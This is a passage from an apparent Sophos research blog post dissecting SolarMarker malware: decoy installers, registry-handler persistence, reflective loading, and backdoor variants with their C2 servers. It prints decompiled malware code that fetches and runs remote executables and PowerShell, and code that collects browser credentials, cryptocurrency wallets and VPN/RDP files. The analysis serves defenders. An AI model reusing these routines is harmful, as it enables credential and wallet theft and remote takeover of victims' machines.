<p>A handful of MSI installers were &#8220;traditional&#8221; MSI files, but they also contained custom action scripts:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/trad-msi-polazert-action-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81505 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/trad-msi-polazert-action-1.png" alt="" width="865" height="415" srcset="https://news.sophos.com/wp-content/uploads/2022/01/trad-msi-polazert-action-1.png 865w, https://news.sophos.com/wp-content/uploads/2022/01/trad-msi-polazert-action-1.png?resize=300,144 300w, https://news.sophos.com/wp-content/uploads/2022/01/trad-msi-polazert-action-1.png?resize=768,368 768w" sizes="auto, (max-width: 865px) 100vw, 865px" /></a></p>
<p>In this case the custom action script contained the PowerShell installer:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-action-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81507 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-action-1.png" alt="" width="1103" height="392" srcset="https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-action-1.png 1103w, https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-action-1.png?resize=300,107 300w, https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-action-1.png?resize=768,273 768w, https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-action-1.png?resize=1024,364 1024w" sizes="auto, (max-width: 1103px) 100vw, 1103px" /></a></p>
<h3>Decoy</h3>
<p>The decoy is a legit installer for Wondershare PDFelement, likely to complete the decoy social engineering process.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/wondershare-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81508 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/wondershare-1.png" alt="" width="451" height="307" srcset="https://news.sophos.com/wp-content/uploads/2022/01/wondershare-1.png 451w, https://news.sophos.com/wp-content/uploads/2022/01/wondershare-1.png?resize=300,204 300w" sizes="auto, (max-width: 451px) 100vw, 451px" /></a></p>
<p>&nbsp;</p>
<p>Some of the newest MSI installers have a different decoy: Adobe Acrobat Pro DC Installer. Because it is and outdated version, on execution it will offer to download the latest version:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/adobeinstaller-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81509 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/adobeinstaller-1.png" alt="" width="372" height="227" srcset="https://news.sophos.com/wp-content/uploads/2022/01/adobeinstaller-1.png 372w, https://news.sophos.com/wp-content/uploads/2022/01/adobeinstaller-1.png?resize=300,183 300w" sizes="auto, (max-width: 372px) 100vw, 372px" /></a></p>
<h3>PowerShell malware installer</h3>
<p>The PowerShell installer does the actual malware deployment, creating  the files and registry keys that establish persistence for the backdoor.</p>
<p>The script contains the actual malware payload (in base64-encoded and encrypted form) in a string variable at the top of the script.  In addition to the payload definition, the beginning of the script also sets two defined functions—one to create random file and directory names for the malware, and another to create a path for a new Windows registry entry.</p>
<p>The script calls these functions as it steps through the installation steps, labeled in red in the screen shot below:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-polazert-code-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81510 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-polazert-code-1.png" alt="" width="1109" height="712" srcset="https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-polazert-code-1.png 1109w, https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-polazert-code-1.png?resize=300,193 300w, https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-polazert-code-1.png?resize=768,493 768w, https://news.sophos.com/wp-content/uploads/2022/01/powershell-installer-polazert-code-1.png?resize=1024,657 1024w" sizes="auto, (max-width: 1109px) 100vw, 1109px" /></a></p>
<p>In some of the samples we examined, the installer scripts end with the comment line:</p>
<pre>#Hello for Squiblydoo</pre>
<p>This is likely in <a href="https://squiblydoo.blog/2021/05/02/mars-deimos-solarmarker-jupyter-infostealer-part-1">tribute to the malware blog </a>that investigated the installation method used in attacks documented in early 2021.</p>
<h3>Persistence with a smoke screen</h3>
<p>The installer creates persistence for the malware by creating a .LNK file in the affected system&#8217;s startup directory.  But instead of pointing to an executable file, this link points to a junk-filled &#8220;smoke screen&#8221; file with a randomly-created file name and extension. The actual execution method for the malware is included in script for  a custom file handler created for a file type defined by this random extension—defined by the installer script in the Windows registry. The commands in the handler&#8217;s script decrypt and execute the actual payload, hidden amongst the random files.</p>
<p>The first part of the installer script following the encrypted payload uses the random name function to create a directory to drop the payload into. The randomly-named folder is created in the path  <strong>%APPDATA%\AdobE</strong>. The installer script also creates an LNK file in the %STARTUP% directory to establish persistence—though not in the way one would expect, as we&#8217;ll explain shortly.</p>
<p>Next, the script deploys a &#8220;smoke screen&#8221; of anywhere from 100 to 300 files, dropping them in the randomly-named directory . With a single exception, these are all files filled with random junk. One file dropped in the same location, however, contains the encrypted payload.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/smokescreen-files-polazert-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81511 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/smokescreen-files-polazert-1.png" alt="" width="451" height="271" srcset="https://news.sophos.com/wp-content/uploads/2022/01/smokescreen-files-polazert-1.png 451w, https://news.sophos.com/wp-content/uploads/2022/01/smokescreen-files-polazert-1.png?resize=300,180 300w" sizes="auto, (max-width: 451px) 100vw, 451px" /></a></p>
<p>The LNK file (in this case, with the file name <strong>a06f383e63a43381f156ee77d9f6f.lNk</strong> ) points to one of these files (<strong>VUPQVfERpBWfmEvrhLOSNZ.NuAoeLuriIQZNSVqcO</strong>):</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/lnkfile-polazert.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-81416" src="https://news.sophos.com/wp-content/uploads/2022/01/lnkfile-polazert.png" alt="" width="640" height="92" srcset="https://news.sophos.com/wp-content/uploads/2022/01/lnkfile-polazert.png 1103w, https://news.sophos.com/wp-content/uploads/2022/01/lnkfile-polazert.png?resize=300,43 300w, https://news.sophos.com/wp-content/uploads/2022/01/lnkfile-polazert.png?resize=768,110 768w, https://news.sophos.com/wp-content/uploads/2022/01/lnkfile-polazert.png?resize=1024,147 1024w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p>Normally, one would expect this linked file to be an executable or script file. But for these SolarMarker campaigns the linked file is one of the random junk files, and cannot be executed itself.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/garbage-smokescreenfile-polazert.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-81417" src="https://news.sophos.com/wp-content/uploads/2022/01/garbage-smokescreenfile-polazert.png" alt="" width="640" height="222" srcset="https://news.sophos.com/wp-content/uploads/2022/01/garbage-smokescreenfile-polazert.png 1100w, https://news.sophos.com/wp-content/uploads/2022/01/garbage-smokescreenfile-polazert.png?resize=300,104 300w, https://news.sophos.com/wp-content/uploads/2022/01/garbage-smokescreenfile-polazert.png?resize=768,267 768w, https://news.sophos.com/wp-content/uploads/2022/01/garbage-smokescreenfile-polazert.png?resize=1024,356 1024w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p>As it turns out, the content of the file is totally irrelevant. What is important is the unique and random file extension, that was used: <strong>.NuAoeLuriIQZNSVqcO. </strong></p>
<p>After dropping the files, the PowerShell installer registers the file extension used for them as a custom file type with a randomly generated name (in this case <strong>ocrrhvyczvnikxofwntsvx</strong>):</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/polazert-custom-handler-reg-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81512 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/polazert-custom-handler-reg-1.png" alt="" width="1105" height="413" srcset="https://news.sophos.com/wp-content/uploads/2022/01/polazert-custom-handler-reg-1.png 1105w, https://news.sophos.com/wp-content/uploads/2022/01/polazert-custom-handler-reg-1.png?resize=300,112 300w, https://news.sophos.com/wp-content/uploads/2022/01/polazert-custom-handler-reg-1.png?resize=768,287 768w, https://news.sophos.com/wp-content/uploads/2022/01/polazert-custom-handler-reg-1.png?resize=1024,383 1024w" sizes="auto, (max-width: 1105px) 100vw, 1105px" /></a></p>
<p>The file type is defined by the script with a custom file open handler. This handler is a PowerShell script:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/file-handler-polazert-pshell-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81513 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/file-handler-polazert-pshell-1.png" alt="" width="1106" height="415" srcset="https://news.sophos.com/wp-content/uploads/2022/01/file-handler-polazert-pshell-1.png 1106w, https://news.sophos.com/wp-content/uploads/2022/01/file-handler-polazert-pshell-1.png?resize=300,113 300w, https://news.sophos.com/wp-content/uploads/2022/01/file-handler-polazert-pshell-1.png?resize=768,288 768w, https://news.sophos.com/wp-content/uploads/2022/01/file-handler-polazert-pshell-1.png?resize=1024,384 1024w" sizes="auto, (max-width: 1106px) 100vw, 1106px" /></a></p>
<p>&nbsp;</p>
<h3></h3>
<h3>Reflected loading</h3>
<p>The script in the handler loads the file containing the encrypted payload (in this case, <strong>EhkpfRkrpDaViAPS\KfWJiiEPmkDO.fFOTagOUMEgIwBH</strong>).  It then uses a key hard-coded into the script to decrypt the payload using a bitwise XOR operation, and then uses reflective loading to execute the now-decrypted DLL, as illustrated on the following beautified code:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/reflective-load-pshell-polazert-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81514 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/reflective-load-pshell-polazert-1.png" alt="" width="1105" height="671" srcset="https://news.sophos.com/wp-content/uploads/2022/01/reflective-load-pshell-polazert-1.png 1105w, https://news.sophos.com/wp-content/uploads/2022/01/reflective-load-pshell-polazert-1.png?resize=300,182 300w, https://news.sophos.com/wp-content/uploads/2022/01/reflective-load-pshell-polazert-1.png?resize=768,466 768w, https://news.sophos.com/wp-content/uploads/2022/01/reflective-load-pshell-polazert-1.png?resize=1024,622 1024w" sizes="auto, (max-width: 1105px) 100vw, 1105px" /></a></p>
<p>The reflectively loaded payload is the Solarmarker backdoor.</p>
<h3>Solarmarker payload</h3>
<p>During this research we identified several variants of the backdoor, the main difference between them is the internal version number, the C2 server and the RSA key used for communication. Each variant is identified with a version ID string:</p>
<pre>public string AppVer = "IN-3";</pre>
<p>Multiple versions communicated with the same server, and there was a unique key for each server.</p>
<table>
<tbody>
<tr>
<td><strong>Version</strong></td>
<td><strong>C2 server</strong></td>
</tr>
<tr>
<td><strong>DR/1.6</strong></td>
<td>http://45.146.165.221</td>
</tr>
<tr>
<td><strong>DR/1.7</strong></td>
<td>http://91.241.19.110</td>
</tr>
<tr>
<td><strong>IN-1</strong></p>
<p><strong>IN-2</strong></p>
<p><strong>IN-3</strong></p>
<p><strong>IN-9</strong></p>
<p><strong>IN-10</strong></td>
<td>http://46.102.152.102</td>
</tr>
<tr>
<td><strong>IN-13</strong></td>
<td>http://185.244.213.64</td>
</tr>
<tr>
<td><strong>IN-10</strong></p>
<p><strong>RB-7</strong></td>
<td>http://192.121.87.53</td>
</tr>
<tr>
<td><strong>J12</strong></td>
<td>http://5.254.118.226</td>
</tr>
<tr>
<td><strong>J13</strong></td>
<td>http://23.29.115.175</td>
</tr>
<tr>
<td><strong>J15</strong></p>
<p><strong>J16</strong></td>
<td>http://92.204.160.110</td>
</tr>
<tr>
<td><strong>SP-W1</strong></td>
<td>http://146.70.24.173</td>
</tr>
<tr>
<td><strong>SP-W2</strong></td>
<td>http://69.46.15.151</td>
</tr>
<tr>
<td><strong>AG-3</strong></p>
<p><strong>AG-5</strong></p>
<p><strong>AG-8</strong></p>
<p><strong>AG-9</strong></td>
<td>http://167.88.15.115</td>
</tr>
<tr>
<td><strong>AG-13</strong></p>
<p><strong>SP-1</strong></p>
<p><strong>SP-3</strong></td>
<td>http://216.230.232.134</td>
</tr>
<tr>
<td><strong>SP-5</strong></p>
<p><strong>SP-7</strong></p>
<p><strong>SP-10</strong></p>
<p><strong>SP-11</strong></td>
<td>http://37.120.237.251</td>
</tr>
<tr>
<td><strong>SP-13</strong></p>
<p><strong>SP-16</strong></td>
<td>http://45.42.201.248</td>
</tr>
<tr>
<td><strong>SP-17</strong></p>
<p><strong>SP-18</strong></td>
<td>http://188.241.83.61</td>
</tr>
<tr>
<td><strong>SP-21</strong></p>
<p><strong>OC-1</strong></p>
<p><strong>OC-3</strong></p>
<p><strong>OC-4</strong></td>
<td>http://146.70.41.157</td>
</tr>
<tr>
<td><strong>NV-1</strong></p>
<p><strong>NV-4</strong></p>
<p><strong>NV-5</strong></p>
<p><strong>NV-6</strong></p>
<p><strong>OC-11</strong></td>
<td>http://92.204.160.233</td>
</tr>
<tr>
<td><strong>OC-8</strong></p>
<p><strong>OC-9</strong></td>
<td>http://37.221.114.23</td>
</tr>
<tr>
<td><strong>OC-7</strong></td>
<td>http://149.255.35.179</td>
</tr>
<tr>
<td><strong>OC-W1</strong></td>
<td>http://104.223.123.7</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Older versions of the backdoor provided different functionality, such as browser data stealing, crypto-wallet stealing, and command execution. But more recent variants of the backdoor have the following, limited capabilities:</p>
<ul>
<li>Run a PowerShell command decoded from a deflate+base64 encoded blob on a remote server.</li>
<li>Run an .EXE file (first saved to %TEMP%) retrieved from a remote server.</li>
</ul>
<p>In all versions of the backdoor, the code contains a lot of junk thread-creation code fragments. These do nothing but break up the readability of the code and add delay cycles to the execution. For example, in this section of code:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/solarmarker-backdoor-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81515 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/solarmarker-backdoor-1.png" alt="" width="1109" height="779" srcset="https://news.sophos.com/wp-content/uploads/2022/01/solarmarker-backdoor-1.png 1109w, https://news.sophos.com/wp-content/uploads/2022/01/solarmarker-backdoor-1.png?resize=300,211 300w, https://news.sophos.com/wp-content/uploads/2022/01/solarmarker-backdoor-1.png?resize=768,539 768w, https://news.sophos.com/wp-content/uploads/2022/01/solarmarker-backdoor-1.png?resize=1024,719 1024w" sizes="auto, (max-width: 1109px) 100vw, 1109px" /></a></p>
<p>&#8230;after removing the junk the about code simplifies to:</p>
<pre>OperatingSystem oSVersion = Environment.OSVersion;
string text;
switch (oSVersion.Version.Major)
{
case 5:
       text = "XP";
       goto IL_16B;
case 6:
{
switch (oSVersion.Version.Minor)
{
       case 0:
              text = "Vista";</pre>
<h3>The evolving backdoor</h3>
<p>Interestingly, the functionality of the latest version of the backdoor is essentially the same as that of  the oldest version we could identify (sha1: 6ccbde9f29fe59077e218b5dc294ca179bd54522, version ID: <em>DR/1.6</em>, timestamp: November 2020). It also allowed the execution of a .EXE program received from the C2 server:</p>
<pre>string text3 = string.Concat(new object[]
{
     Environment.GetEnvironmentVariable("temp"),
     '\\',
     M.GenRandomString(24),
     ".exe"
});
byte[] bytes2 = M.DecryptRaw(M.Req(addr,
…
File.WriteAllBytes(text3, bytes2);
Process.Start(text3);</pre>
<p>And it also provided for the execution of a PowerShell file received from the C2 server:</p>
<pre>string text2 = string.Concat(new object[]
{
     Environment.GetEnvironmentVariable("temp"),
     '\\',
     M.GenRandomString(24),
     ".ps1"
});
byte[] bytes = M.DecryptRaw(M.Req(addr,
…
File.WriteAllBytes(text2, bytes);
Process.Start(new ProcessStartInfo
{
     FileName = "powershell",
     Arguments = "-ep bypass -command \"iex(get-content '" + text2 + "')\"",
     WindowStyle = ProcessWindowStyle.Hidden
});
Thread.Sleep(15000);
File.Delete(text2);

</pre>
<p>Finally it could executed a PowerShell command received as a string from the C2 server:</p>
<pre>else if (value == "command") { 
   string value2 = ((M.JsonValue)jsonObject.Get("task_id")).value; 
   string value4 = ((M.JsonValue)jsonObject.Get("command")).value; 
   Process.Start(new ProcessStartInfo { 
   FileName = "powershell", Arguments = "-ep bypass -command \"" + value4 + "\"", WindowStyle = ProcessWindowStyle.Hidden });</pre>
<p>In this oldest version, the data sent to the C2 server was encrypted using a XOR algorithm using a hardcoded key. This encryption scheme was later replaced with more secure RSA encryption.</p>
<p>In addition to the RSA encrypted communication, later variants added other functionality, while removing some of the older ones. Version <strong>J13</strong> (sha1: 55c692913894a282189e0dff5dcd60e29ad89046, time stamp September 2021), for instance, does not provide any remote execution options. Instead, it collects browser data and sends it to the C2 server.</p>
<pre>if (File.Exists(directoryInfo2.FullName + "\\logins.json") &amp;&amp; File.Exists(directoryInfo2.FullName + "\\key4.db") &amp;&amp; File.Exists(directoryInfo2.FullName + "\\cert9.db") &amp;&amp; File.Exists(directoryInfo2.FullName + "\\cookies.sqlite") &amp;&amp; File.Exists(directoryInfo2.FullName + "\\formhistory.sqlite"))
{
   this.a = this.f(directoryInfo2.FullName + "\\cert9.db");
   this.b = this.f(directoryInfo2.FullName + "\\key4.db");
   this.c = this.f(directoryInfo2.FullName + "\\logins.json");
   this.d = this.f(directoryInfo2.FullName + "\\cookies.sqlite");
   this.e = this.f(directoryInfo2.FullName + "\\formhistory.sqlite");


</pre>
<p>This version targets multiple browsers (Chrome, Edge, Brave, Opera, Firefox):</p>
<pre>{
'\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','G','o','o','g','l','e',
'\\','C','h','r','o','m','e','\\','U','s','e','r',' ','D','a','t','a'
}), list);

Main.a(Main.a(new char[]
{
'e','d','g','e'
}), environmentVariable + Main.a(new char[]

{
'\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','M','i','c','r','o','s','o','f','t',
'\\','E','d','g','e','\\','U','s','e','r',' ','D','a','t','a'
}), list);

Main.a(Main.a(new char[]
{
'o','p','e','r','a'
}), environmentVariable + Main.a(new char[]
{
'\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\','O','p','e','r','a',' 
','S','o','f','t','w','a','r','e','\\','O','p','e','r','a',' ','S','t','a','b','l','e'
}), list);
Main.a(Main.a(new char[]
{
'b','r','a','v','e'
}), environmentVariable + Main.a(new char[]
{
'\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','B','r','a','v','e',
'S','o','f','t','w','a','r','e','\\','B','r','a','v','e','-','B','r','o','w','s','e','r',
'\\','U','s','e','r',' ','D','a','t','a'
}), list);
try
{
Main.k k = new Main.k(Main.a(new char[]
{
    'f','i','r','e','f','o','x'
}), environmentVariable + Main.a(new char[]
{
'\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\',
'M','o','z','i','l','l','a','\\','F','i','r','e','f','o','x','\\','P','r','o','f','i','l','e','s'
}));
</pre>
<p>Version J12 (sha1: ee19506006b67c58933b471597e777b2675fba92, compilation time September 2021) added cryptowallet stealing as a functionality.</p>
<pre>string environmentVariable = Environment.GetEnvironmentVariable("userprofile");
string text = environmentVariable + "\\AppData\\Roaming";
string text2 = environmentVariable + "\\AppData\\Local";
Main.a(list, "Atomic", "Wallet", "*", text + "\\atomic\\Local Storage\\leveldb", false);
Main.a(list, "Guarda", "Wallet", "*", text + "\\Guarda\\Local Storage\\leveldb", false);
Main.a(list, "SimpleOS", "Wallet", "*", text + "\\simpleos\\Local Storage\\leveldb", false);
Main.a(list, "Neon", "Wallet", "*", text + "\\Neon\\Local Storage\\leveldb", false);
Main.a(list, "Wasabi", "Wallet", "*", text + "\\WalletWasabi\\Client\\Wallets", false);
Main.a(list, "MyMonero", "Wallet", "*.mmd*", text + "\\MyMonero", false);
Main.a(list, "Jaxx", "Wallet", "*", text + "\\Jaxx\\Local Storage\\leveldb", false);
Main.a(list, "Jaxx", "Wallet", "*", text + "\\com.liberty.jaxx\\IndexedDB", false);
Main.a(list, "Electrum", "Wallet", "*", text + "\\Electrum\\wallets", false);
Main.a(list, "Ethereum", "Wallet", "*", text + "\\Ethereum\\keystore", false);
Main.a(list, "Exodus", "Wallet", "*", text + "\\Exodus\\exodus.wallet", false);
Main.a(list, "GreenAddress", "Wallet", "*", text + "\\GreenAddress Wallet\\Local Storage\\leveldb", false);
Main.a(list, "Coin Wallet", "Wallet", "*", text + "\\Coin Wallet\\Local Storage\\leveldb", false);
Main.a(list, "Bither", "Wallet", "*", text + "\\Bither", false);
Main.a(list, "Coinomi", "Wallet", "*", text2 + "\\Coinomi\\Coinomi\\wallets", false);
Main.a(list, "Ledger Live", "Hardware wallet", "*.json", text + "\\Ledger Live", false);
Main.a(list, "Trinity", "Hardware wallet", "*.realm", text + "\\Trinity", false);
Main.a(list, "Scatter", "Hardware wallet", "*.json", text + "\\scatter", false);
Main.a(list, "Unknown?", "Wallet?", "*wallet*.dat", text, false);
Main.a(list, "Unknown?", "Wallet?", "*.wallet", text, false);
Main.a(list, "Unknown?", "Wallet?", "*wallet*.dat", text2, false);
Main.a(list, "Unknown?", "Wallet?", "*.wallet", text2, false);
string[] directories = Directory.GetDirectories(text, "Electrum-*");
string[] array = directories;
for (int i = 0; i &lt; array.Length; i++)
{
string str = array[i];
Main.a(list, "Electrum", "Wallet", "*", str + "\\wallets", false);
}</pre>
<p>In this variant, as shown in the code above, SolarMarker collects the wallets of the following cryptocurrencies:</p>
<ul>
<li>Atomic</li>
<li>Guarda</li>
<li>SimpleOS</li>
<li>Neon</li>
<li>Wasabi</li>
<li>MyMonero</li>
<li>Jaxx</li>
<li>Electrum</li>
<li>Ethereum</li>
<li>Exodus</li>
<li>GreenAddress</li>
<li>Coin</li>
<li>Bither</li>
<li>Coinomi</li>
<li>Ledger</li>
<li>Trinity</li>
<li>Scatter</li>
</ul>
<p>Additionally this variant collects VPN and RDP configs:</p>
<pre>Main.a(list, "OpenVPN?", "VPN?", "*.*vpn", environmentVariable, true);
Main.a(list, "RDP", "RDP", "*.rdp", environmentVariable, true);
</pre>
<h3>The latest model</h3>
<p>The most recent version we&#8217;ve analyzed creates a text file with path like:</p>
<p><strong>%PROFILE%\AppData\Roaming\279285253294232222272216305245290297297239249276271219226274280293290274218258302282286231248295323257262221246241273.awYKBgIaGxZ3DQM=</strong></p>
<p>The contents of this file is an encoded string (in this case, <strong>2CJDEX5HFXHRXL3FK53CXRS9U8L5EDDC</strong> ) which serves as a unique system ID (HWID) , generated from the content of files in %APPDATA%, or generated randomly, if empty.</p>
<p>The backdoor calls back to the C2 server with a  JSON message to C2 server with basic config data:</p>
<pre>{"action":"ping","hwid":"A8IFX8YU3NJIU8PFJ0XFMMXDCWFQT9UG","pc_name":"{redacted}","os_name":"Win 7","arch":"x86","rights":"User","version":"OC-8","workgroup":"? | ?","dns":0,"protocol_version":2}</pre>
<p>This message is sent to the server encrypted with a hardcoded RSA key.</p>
<pre>&lt;Main&gt;
&lt;Modulus&gt;q7lnDVdxQRSYhRPYcqRaqkwV9sRGLxrKNMOSsxFSdJ30bswOmMHEeUe7Z/3rGI3dmlnSC77I/
qwWkzf73lF+SPFmIw4ma84JIVDW76k+eEP2iguC9zGNXaPBajogFRf8K2HgIwF/eni/wmnrtzhryxIE5mNJzAREsICbA/
/RzfTU3C7JPlkCys0q9uVlkQLO9ijQHyHuUE+uk0nGk2+0t91hW+efqz5i8iy92hFm3dnD005mogpXA+18pFeFu8x1hrr
PFhaHY9m1Xl7oyBZ8nnol4uDdPNzkGNCsUOZtSVQE8wZc5yaFKBU2uuCl8IHaQMhENrNMR0EWlMTYgrAWYw==
&lt;/Modulus&gt;
&lt;Exponent&gt;AQAB&lt;/Exponent&gt;
&lt;/Main&gt;</pre>
<p>&nbsp;</p>
<p>Further communications with the server will be encrypted with the original config buffer.</p>
<p>So, the initial report-back call communication data is encrypted using the hard-coded RSA key with asymmetric RSA algorithm, the rest of the communication uses the config buffer as a key using symmetric AES CBC algorithm.</p>
<p>The C2 server is selected from a possible array of server names, which in the analized sample contained only a single entry: hxxp://37[.]221.114.23</p>
<p>As noted earlier, this version of the backdoor&#8217;s functionality is limited to executing some next-stage code. For that, the backdoor provides multiple approaches. It can:</p>
<ul>
<li>download and execute a Windows executable</li>
<li>download and execute a PowerShell script</li>
<li>download and load a .Net DLL</li>
<li>run a PowerShell command received as a string</li>
</ul>
<p>Running PowerShell and a command is done the same way: the payload is expected to be a compressed gzip stream with base64 encoding on top:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/payload-polazert-c2.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-81474" src="https://news.sophos.com/wp-content/uploads/2022/01/payload-polazert-c2.png" alt="" width="404" height="312" srcset="https://news.sophos.com/wp-content/uploads/2022/01/payload-polazert-c2.png 404w, https://news.sophos.com/wp-content/uploads/2022/01/payload-polazert-c2.png?resize=300,232 300w" sizes="auto, (max-width: 404px) 100vw, 404px" /></a></p>
<p>The .Net module is loaded in memory, the Run function of the Module.Main class is executed:</p>
<pre>mpool.a9bd1e9d79f46a96330eecb53f054(Program.ad10fd14022445bfbbcdf53ea0fba(Program.get_msg_get_file(cfg.hwid, text4), cfg), Program.chararray_to_str(new char[]
{
'M','o','d','u','l','e','.','M','a','i','n'
}), Program.chararray_to_str(new char[]
{
'R','u','n'
}), str3);

</pre>
<p>&nbsp;</p>
<h3>Conclusion</h3>
<p>There are currently no active SolarMarker-spreading campaigns, as the final download site used by the operators of the campaign was shut down. But SolarMarker deployments remain active, and while we&#8217;ve seen a decline in detections of the malware since November of 2021, the malware has not disappeared. It may be just a matter of time before a new campaign using new infrastructure is launched.</p>
<p>While ransomware operators and other malicious actors draw much of defenders&#8217; focus to well-documented malware delivery methods—phishing emails, Remote Desktop Protocol exploitation, and remote code execution vulnerabilities)— there are still some active campaigns that use SEO as delivery method, as demonstrated by other malware delivery-as-a-service schemes. Because we don&#8217;t pay much attention to this delivery method, these SEO-based campaigns can slip under the radar of defenders until it is too late and the payload has already been deployed.</p>
<p>Organizations need to train users on the risks of SEO poisoning and how to identify potentially malicious results. But that education may not be enough to prevent malicious downloads through highly-targeted search terms, so a defense in depth is best.</p>
<p>Sophos detects the PowerShell installer as Troj/PS-JA, the reflective loader as AMSI/SolarM-A and the final payload as Mal/Polazert-A. A list of IOCs for SolaerMarker is available on the <a href="https://github.com/sophoslabs/IoCs/blob/master/Troj-Polazert_IOCs.csv">SophosLabs GitHub page</a>.</p>
			</div>
	<div class="mt-12">
		
<ul
	id="social-sharing"
	class="flex justify-center items-center space-x-6"
>
	<li class="facebook">
		<a
			class="js-share-modal"
			href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=81186&#038;title=SolarMarker%20campaign%20used%20novel%20registry%20changes%20to%20establish%20persistence"
			data-title="SolarMarker campaign used novel registry changes to establish persistence"
			title="Share on Facebook">
				<span class="sr-only">Share on Facebook</span>
				<svg
					width="8"
					height="16"
					xmlns="http://www.w3.org/2000/svg"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M7.145 8.006H4.903V16H1.581V8.006H0V5.182h1.581V3.354C1.581 2.045 2.202 0 4.933 0l2.461.01v2.742H5.608c-.291 0-.705.145-.705.77v1.66h2.533l-.291 2.824z" fill-rule="nonzero"/>
				</svg>
		</a>
	</li>
	<li class="twitter">
		<a
			class="js-share-modal"
			href="http://twitter.com/intent/tweet?text=SolarMarker%20campaign%20used%20novel%20registry%20changes%20to%20establish%20persistence%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D81186"
			data-title=""
			title="Share on X">
				<span class="sr-only">Share on X</span>
				<svg
					xmlns="http://www.w3.org/2000/svg"
					width="16"
					height="16"
					class="text-sophos-gray-600 hover:text-black"
					fill="currentColor"
				>
					<path d="M12.163 1.5h2.206L9.55 7.006l5.669 7.494H10.78L7.303 9.956 3.328 14.5h-2.21l5.154-5.89L.838 1.5h4.55l3.14 4.153zm-.776 11.681h1.222L4.722 2.75H3.409z"/>
				</svg>
		</a>
	</li>
	<li class="linkedin">
		<a
			href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/"
			data-title="SolarMarker campaign used novel registry changes to establish persistence"
			title="Share on LinkedIn"
			onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;">
			<span class="sr-only">Share on LinkedIn</span>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M16 15.293h-3.43v-5.52c0-1.386-.496-2.334-1.738-2.334-.946 0-1.512.64-1.76 1.256-.09.22-.113.526-.113.836v5.762H5.53s.044-9.35 0-10.316h3.43v1.46c.456-.705 1.27-1.703 3.091-1.703 2.256 0 3.95 1.473 3.95 4.643v5.916zM1.917 3.566h-.022C.745 3.566 0 2.773 0 1.783 0 .772.768 0 1.94 0c1.173 0 1.896.772 1.917 1.783 0 .99-.744 1.783-1.94 1.783zM.202 15.293h3.431V4.977H.203v10.316z" fill-rule="nonzero"/>
			</svg>
		</a>
	</li>
	<li class="comments">
		<a
			href="#comments"
			title="Leave a Reply"
			class="flex items-center space-x-1"
		>
			<svg
				width="16"
				height="16"
				xmlns="http://www.w3.org/2000/svg"
				class="text-sophos-gray-600 hover:text-black"
				fill="currentColor"
			>
				<path d="M8.5 0a7.5 7.5 0 11-3.916 13.898C3.317 15.273 1.773 15.36.256 15.135c1.011-1.185 1.678-2.357 2-3.517l-.007.027A7.5 7.5 0 018.5 0z" fill-rule="evenodd"/>
			</svg>
							<span class="font-medium font-sansMedium text-xs">1</span>
					</a>
	</li>
</ul>

			</div><!-- .entry-social -->
	</div>

</article><!-- #post-## -->

			<div class="container my-8 md:my-16">
